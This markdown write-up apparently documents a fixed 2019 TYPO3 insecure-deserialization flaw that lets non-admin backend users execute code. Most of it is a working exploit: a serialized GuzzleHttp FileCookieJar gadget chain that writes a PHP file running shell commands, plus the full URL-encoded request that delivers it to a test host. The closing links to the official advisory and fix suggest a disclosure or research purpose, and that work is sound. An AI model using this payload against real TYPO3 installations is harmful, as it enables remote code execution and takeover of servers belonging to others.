# Code Execution

This scenario describes how non-admin users can trigger code execution.

### Security Vulnerability

`overrideVals[<table>][l10n_diffsource]=PAYLOAD` is vulnerable to insecure deserialization.

**Steps**

* prepare insecure `PAYLOAD`
  + using `\GuzzleHttp\Cookie\FileCookieJar` to inject executable code as file
* call prepared URI as non-admin user in TYPO3 backend

**Plain**

```
O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{
s:41:"GuzzleHttp\Cookie\FileCookieJarfilename";
s:8:"hack.php";s:52:"GuzzleHttp\Cookie\FileCookieJarstoreSessionCookies";b:1;
s:39:"GuzzleHttp\Cookie\CookieJarstrictMode";N;
s:36:"GuzzleHttp\Cookie\CookieJarcookies";a:1:{
i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"GuzzleHttp\Cookie\SetCookiedata";
a:9:{s:4:"Name";s:10:"CookieName";
s:5:"Value";s:91:"<hr><pre><?php var_dump(__DIR__); system('ls -la ..'); system('ls -la ../..'); ?></pre><hr>";
s:6:"Domain";s:12:"CookieDomain";s:4:"Path";s:1:"/";s:7:"Max-Age";N;s:7:"Expires";i:1;s:6:"Secure";b:0;
s:7:"Discard";b:0;s:8:"HttpOnly";b:0;}}}}
```

**URL**

```
http://typo3v9-hack.ddev.site/typo3/?route=%2Frecord%2Fedit&token=c6336cb47560d1d26584d4d751f6f6b9613323b1
&edit%5Bpages%5D%5B-1%5D=new&overrideVals%5Bpages%5D%5Bsys_language_uid%5D=1
&overrideVals%5Bpages%5D%5Bl10n_parent%5D=1
&overrideVals%5Bpages%5D%5Bl10n_diffsource%5D=O%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A8%3A%22hack.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A9%3A%7Bs%3A4%3A%22Name%22%3Bs%3A10%3A%22CookieName%22%3Bs%3A5%3A%22Value%22%3Bs%3A91%3A%22%3Chr%3E%3Cpre%3E%3C%3Fphp%20var_dump%28__DIR__%29%3B%20system%28%27ls%20-la%20..%27%29%3B%20system%28%27ls%20-la%20..%2F..%27%29%3B%20%3F%3E%3C%2Fpre%3E%3Chr%3E%22%3Bs%3A6%3A%22Domain%22%3Bs%3A12%3A%22CookieDomain%22%3Bs%3A4%3A%22Path%22%3Bs%3A1%3A%22%2F%22%3Bs%3A7%3A%22Max-Age%22%3BN%3Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A6%3A%22Secure%22%3Bb%3A0%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A8%3A%22HttpOnly%22%3Bb%3A0%3B%7D%7D%7D%7D&returnUrl=%2Ftypo3%2Fhack.php
```

### Security Vulnerability

* issue has been addressed and fixed in stable TYPO3 branches
  + https://typo3.org/security/advisory/typo3-core-sa-2019-020/
  + https://review.typo3.org/c/Packages/TYPO3.CMS/+/61139
  + https://blog.ripstech.com/2019/typo3-overriding-the-database/